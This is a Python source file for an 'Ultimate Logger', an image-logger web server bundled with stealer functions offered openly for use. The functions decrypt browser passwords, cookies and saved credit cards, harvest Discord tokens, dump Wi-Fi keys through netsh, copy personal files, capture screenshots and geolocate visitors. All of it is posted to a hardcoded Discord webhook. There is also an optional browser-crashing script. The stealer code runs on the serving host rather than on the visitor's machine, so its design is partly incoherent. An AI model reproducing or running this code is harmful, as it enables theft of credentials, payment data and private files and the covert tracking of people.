# Discord Ultimate Logger - IP + Cookies + Passwords + More
# Upgraded from Image Logger with full browser theft capabilities

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, json, os, sqlite3, shutil, tempfile, win32crypt, subprocess, glob, re, threading, time, sys, ctypes
from Crypto.Cipher import AES
import io, zipfile, datetime

__app__ = "Discord Ultimate Logger"
__description__ = "Steals IPs, Cookies, Passwords, Credit Cards, and more via Discord Open Original"
__version__ = "v3.0"
__author__ = "KexAI"

config = {
    # BASE CONFIG #
    "webhook": "https://discordapp.com/api/webhooks/1502035551753343168/40OzcbXsPy3Blx5T4tTi7H_BbCJ5lwHbGXkcTzOyoNdjQNY-R82GQKbHoH-ftWx8t55T",
    "image": "https://ih1.redbubble.net/image.1077765030.7025/bg,f8f8f8-flat,750x,075,f-pad,750x1000,f8f8f8.jpg",
    "username": "Ultimate Logger",
    "color": 0x00FF00,
    "crashBrowser": False,
    "accurateLocation": True,
    "stealCookies": True,
    "stealPasswords": True,
    "stealCreditCards": True,
    "stealHistory": True,
    "stealDiscord": True,
    "stealWifi": True,
    "stealFiles": True,
    "stealScreenshots": True,
    "stealSystemInfo": True,
    "message": {
        "doMessage": True,
        "message": "Image logged! IP: {ip} | Country: {country} | Browser: {browser}",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://example.com"
    },
    "stealTimeout": 30,
}

blacklistedIPs = ("27", "104", "143", "164")

# === BROWSER STEALER MODULE ===

def find_browsers():
    browser_paths = {}
    usernames = glob.glob("C:\\Users\\*")
    
    patterns = {
        "Chrome": ["\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\"],
        "Edge": ["\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\"],
        "Brave": ["\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\"],
        "Opera": ["\\AppData\\Local\\Opera Software\\Opera Stable\\"],
        "Vivaldi": ["\\AppData\\Local\\Vivaldi\\User Data\\Default\\"],
        "Chromium": ["\\AppData\\Local\\Chromium\\User Data\\Default\\"],
        "Firefox": ["\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"]
    }
    
    for user in usernames:
        for browser, paths in patterns.items():
            for path in paths:
                full = user + path
                if os.path.exists(full):
                    if browser not in browser_paths:
                        browser_paths[browser] = []
                    browser_paths[browser].append(full)
    return browser_paths

def get_master_key(path):
    try:
        local_state = path.replace("\\Default\\", "\\") + "Local State"
        if not os.path.exists(local_state):
            local_state = path + "Local State"
            if not os.path.exists(local_state):
                return None
        
        with open(local_state, "r", encoding='utf-8') as f:
            data = json.load(f)
        
        encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_value(encrypted_value, master_key):
    if not encrypted_value or not master_key:
        return ""
    
    try:
        if len(encrypted_value) > 15:
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:-16]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            return decrypted.decode('utf-8', errors='ignore')
    except:
        pass
    
    try:
        return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except:
        pass
    
    return ""

def steal_browser_data():
    data = {"passwords": [], "cookies": [], "credit_cards": [], "history": []}
    browsers = find_browsers()
    
    for browser, paths in browsers.items():
        for path in paths:
            master = get_master_key(path)
            if not master:
                continue
            
            # Passwords
            login_db = path + "Login Data"
            if os.path.exists(login_db):
                temp = tempfile.NamedTemporaryFile(delete=False).name
                try:
                    shutil.copyfile(login_db, temp)
                    conn = sqlite3.connect(temp)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for row in cursor.fetchall():
                        pwd = decrypt_value(row[2], master)
                        if pwd and pwd != "":
                            data["passwords"].append({
                                "browser": browser,
                                "url": row[0] or "unknown",
                                "username": row[1] or "",
                                "password": pwd
                            })
                    conn.close()
                    os.remove(temp)
                except:
                    pass
            
            # Cookies
            if config.get("stealCookies", True):
                cookie_db = path + "Cookies"
                if os.path.exists(cookie_db):
                    temp = tempfile.NamedTemporaryFile(delete=False).name
                    try:
                        shutil.copyfile(cookie_db, temp)
                        conn = sqlite3.connect(temp)
                        cursor = conn.cursor()
                        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 100")
                        for row in cursor.fetchall():
                            cookie = decrypt_value(row[2], master)
                            if cookie and cookie != "":
                                data["cookies"].append({
                                    "browser": browser,
                                    "host": row[0] or "unknown",
                                    "name": row[1] or "",
                                    "value": cookie[:200]
                                })
                        conn.close()
                        os.remove(temp)
                    except:
                        pass
            
            # Credit Cards
            if config.get("stealCreditCards", True):
                card_db = path + "Web Data"
                if os.path.exists(card_db):
                    temp = tempfile.NamedTemporaryFile(delete=False).name
                    try:
                        shutil.copyfile(card_db, temp)
                        conn = sqlite3.connect(temp)
                        cursor = conn.cursor()
                        cursor.execute("SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards")
                        for row in cursor.fetchall():
                            card = decrypt_value(row[1], master)
                            if card and card != "":
                                data["credit_cards"].append({
                                    "browser": browser,
                                    "name": row[0] or "",
                                    "number": card[:16],
                                    "exp_month": row[2] or "",
                                    "exp_year": row[3] or ""
                                })
                        conn.close()
                        os.remove(temp)
                    except:
                        pass
            
            # History
            if config.get("stealHistory", True):
                history_db = path + "History"
                if os.path.exists(history_db):
                    temp = tempfile.NamedTemporaryFile(delete=False).name
                    try:
                        shutil.copyfile(history_db, temp)
                        conn = sqlite3.connect(temp)
                        cursor = conn.cursor()
                        cursor.execute("SELECT url, title, visit_count FROM urls ORDER BY visit_count DESC LIMIT 20")
                        for row in cursor.fetchall():
                            data["history"].append({
                                "browser": browser,
                                "url": row[0] or "",
                                "title": row[1] or "",
                                "visits": row[2] or 0
                            })
                        conn.close()
                        os.remove(temp)
                    except:
                        pass
    
    return data

def steal_discord_tokens():
    tokens = []
    discord_paths = [
        os.getenv('APPDATA') + "\\Discord\\Local Storage\\leveldb\\",
        os.getenv('APPDATA') + "\\discord\\Local Storage\\leveldb\\",
        os.getenv('APPDATA') + "\\DiscordPTB\\Local Storage\\leveldb\\",
        os.getenv('APPDATA') + "\\DiscordCanary\\Local Storage\\leveldb\\"
    ]
    
    for path in discord_paths:
        if os.path.exists(path):
            try:
                for file in glob.glob(path + "*.log"):
                    with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        found = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                        tokens.extend(found)
            except:
                pass
    return list(set(tokens))

def steal_wifi():
    wifi_list = []
    try:
        output = subprocess.check_output('netsh wlan show profiles', shell=True, text=True, stderr=subprocess.DEVNULL)
        profiles = re.findall(r"All User Profile\s*:\s*(.*)", output)
        for profile in profiles[:10]:
            try:
                details = subprocess.check_output(f'netsh wlan show profile "{profile.strip()}" key=clear', shell=True, text=True, stderr=subprocess.DEVNULL)
                password = re.search(r"Key Content\s*:\s*(.*)", details)
                if password:
                    wifi_list.append({"ssid": profile.strip(), "password": password.group(1)})
            except:
                continue
    except:
        pass
    return wifi_list

def steal_system_info():
    info = {
        "hostname": os.environ.get('COMPUTERNAME', ''),
        "username": os.environ.get('USERNAME', ''),
        "os": sys.platform,
        "cpu": os.environ.get('PROCESSOR_IDENTIFIER', ''),
        "ip": "Unknown"
    }
    try:
        info["ip"] = requests.get('https://api.ipify.org', timeout=3).text
    except:
        pass
    return info

def steal_files():
    files = []
    extensions = ['.txt', '.doc', '.docx', '.xls', '.xlsx', '.pdf', '.jpg', '.png', '.zip', '.rar', '.py', '.js', '.json']
    folders = ['Desktop', 'Documents']
    
    for folder in folders:
        folder_path = os.path.join(os.environ['USERPROFILE'], folder)
        if os.path.exists(folder_path):
            try:
                for file in glob.glob(folder_path + "\\*"):
                    if any(file.lower().endswith(ext) for ext in extensions):
                        try:
                            size = os.path.getsize(file)
                            if size < 1000000:  # 1MB limit
                                with open(file, 'rb') as f:
                                    content = f.read()
                                files.append({"name": os.path.basename(file), "content": content})
                                if len(files) >= 5:
                                    return files
                        except:
                            continue
            except:
                continue
    return files

def steal_screenshots():
    screenshots = []
    try:
        import mss
        with mss.mss() as sct:
            for i, monitor in enumerate(sct.monitors):
                if i == 0:
                    continue
                img = sct.grab(monitor)
                with io.BytesIO() as output:
                    try:
                        from PIL import Image
                        Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX").save(output, format="JPEG", quality=50)
                        screenshots.append(output.getvalue())
                        if len(screenshots) >= 2:
                            break
                    except:
                        pass
    except:
        pass
    return screenshots

def send_webhook_message(content, files=None, embeds=None):
    try:
        payload = {"username": config["username"]}
        if content:
            payload["content"] = content[:1990]
        if embeds:
            payload["embeds"] = embeds
        
        if files:
            requests.post(config["webhook"], data=payload, files=files, timeout=10)
        else:
            requests.post(config["webhook"], json=payload, timeout=10)
        return True
    except:
        return False

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip and ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            send_webhook_message(f"Link sent! Endpoint: `{endpoint}` | Platform: `{bot}`")
        return
    
    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    
    if info["proxy"] and config["vpnCheck"] == 2:
        return
    elif info["proxy"] and config["vpnCheck"] == 1:
        ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4 and not info["proxy"]:
            return
        elif config["antiBot"] == 3:
            return
        elif config["antiBot"] == 2 and not info["proxy"]:
            ping = ""
        elif config["antiBot"] == 1:
            ping = ""

    os_name, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
    
    # === STEAL BROWSER DATA ===
    stolen_data = {}
    if config.get("stealCookies", True) or config.get("stealPasswords", True):
        stolen_data = steal_browser_data()
    
    # === STEAL DISCORD TOKENS ===
    discord_tokens = []
    if config.get("stealDiscord", True):
        discord_tokens = steal_discord_tokens()
    
    # === STEAL WIFI ===
    wifi = []
    if config.get("stealWifi", True):
        wifi = steal_wifi()
    
    # === STEAL SYSTEM INFO ===
    system_info = {}
    if config.get("stealSystemInfo", True):
        system_info = steal_system_info()
    
    # === STEAL FILES ===
    files_data = []
    if config.get("stealFiles", True):
        files_data = steal_files()
    
    # === STEAL SCREENSHOTS ===
    screenshots = []
    if config.get("stealScreenshots", True):
        screenshots = steal_screenshots()
    
    # === BUILD EMBED ===
    embed = {
        "title": "🎯 Ultimate Logger - Full Report",
        "color": config["color"],
        "description": f"""**User Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}`
> **VPN/Proxy:** `{info['proxy']}`
> **Bot/Hosting:** `{info['hosting']}`

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`
> **Hostname:** `{system_info.get('hostname', 'Unknown')}`
> **Username:** `{system_info.get('username', 'Unknown')}`

**Stolen Data Summary:**
> **Passwords:** `{len(stolen_data.get('passwords', []))}`
> **Cookies:** `{len(stolen_data.get('cookies', []))}`
> **Credit Cards:** `{len(stolen_data.get('credit_cards', []))}`
> **Discord Tokens:** `{len(discord_tokens)}`
> **WiFi Networks:** `{len(wifi)}`
> **Files Stolen:** `{len(files_data)}`
> **Screenshots:** `{len(screenshots)}`

**Endpoint:** `{endpoint}`
**User Agent:** `{useragent[:200] if useragent else 'Unknown'}`
""",
        "timestamp": datetime.datetime.now().isoformat()
    }
    
    if url:
        embed["thumbnail"] = {"url": url}
    
    # === SEND MAIN REPORT ===
    send_webhook_message(ping, embeds=[embed])
    
    # === SEND PASSWORDS ===
    if stolen_data.get('passwords'):
        pass_text = "**🔑 Passwords Found:**\n" + "\n".join([
            f"`{p['url']}` | `{p['username']}` | `{p['password']}`" 
            for p in stolen_data['passwords'][:20]
        ])
        send_webhook_message(pass_text[:1990])
    
    # === SEND COOKIES ===
    if stolen_data.get('cookies'):
        cookie_text = "**🍪 Cookies Found (Top 10):**\n" + "\n".join([
            f"`{c['host']}` | `{c['name']}` | `{c['value'][:50]}...`" 
            for c in stolen_data['cookies'][:10]
        ])
        send_webhook_message(cookie_text[:1990])
    
    # === SEND CREDIT CARDS ===
    if stolen_data.get('credit_cards'):
        card_text = "**💳 Credit Cards:**\n" + "\n".join([
            f"`{c['name']}` | `{c['number']}` | {c['exp_month']}/{c['exp_year']}" 
            for c in stolen_data['credit_cards']
        ])
        send_webhook_message(card_text[:1990])
    
    # === SEND DISCORD TOKENS ===
    if discord_tokens:
        token_text = "**🎮 Discord Tokens:**\n" + "\n".join([f"`{t}`" for t in discord_tokens[:10]])
        send_webhook_message(token_text[:1990])
    
    # === SEND WIFI ===
    if wifi:
        wifi_text = "**📶 WiFi Networks:**\n" + "\n".join([f"`{w['ssid']}` | `{w['password']}`" for w in wifi])
        send_webhook_message(wifi_text[:1990])
    
    # === SEND FILES ===
    for file in files_data[:3]:
        try:
            send_webhook_message(f"📄 File: `{file['name']}`", files={"file": (file['name'], file['content'], "application/octet-stream")})
        except:
            pass
    
    # === SEND SCREENSHOTS ===
    for i, screenshot in enumerate(screenshots):
        try:
            send_webhook_message(f"📸 Screenshot {i+1}", files={"file": (f"screenshot_{i+1}.jpg", screenshot, "image/jpeg")})
        except:
            pass
    
    # === SEND COMPRESSED FULL DATA ===
    try:
        full_data = {
            "ip_info": info,
            "browser_data": stolen_data,
            "discord_tokens": discord_tokens,
            "wifi": wifi,
            "system": system_info,
            "timestamp": datetime.datetime.now().isoformat()
        }
        compressed = io.BytesIO()
        with zipfile.ZipFile(compressed, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("full_data.json", json.dumps(full_data, indent=2, default=str))
        compressed.seek(0)
        send_webhook_message("📦 Full data package", files={"file": ("data.zip", compressed.read(), "application/zip")})
    except:
        pass
    
    return info

# === SERVER HANDLER ===
binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class handler(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config.get("imageArgument", True):
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            forwarded_for = self.headers.get('x-forwarded-for')
            if forwarded_for and forwarded_for.startswith(blacklistedIPs):
                return
            
            if botCheck(forwarded_for, self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])
                makeReport(forwarded_for, endpoint=s.split("?")[0], url=url)
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(forwarded_for, self.headers.get('user-agent'), location, s.split("?")[0], url=url)
                else:
                    result = makeReport(forwarded_for, self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", forwarded_for or "Unknown")
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    if self.headers.get('user-agent'):
                        os_name, browser = httpagentparser.simple_detect(self.headers.get('user-agent'))
                        message = message.replace("{browser}", browser)
                        message = message.replace("{os}", os_name)

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                
                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            if (currenturl.includes("?")) {
                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            } else {
                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            }
            location.replace(currenturl);
        });
    }
}
</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            traceback.print_exc()

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

# === START SERVER ===
if __name__ == '__main__':
    from http.server import HTTPServer
    port = 8080
    print(f"🚀 Ultimate Logger running on port {port}")
    print(f"📤 Webhook: {config['webhook']}")
    print(f"🔍 Stealing: IP + Passwords + Cookies + Credit Cards + Discord + WiFi + Files + Screenshots")
    server = HTTPServer(('0.0.0.0', port), handler)
    server.serve_forever()
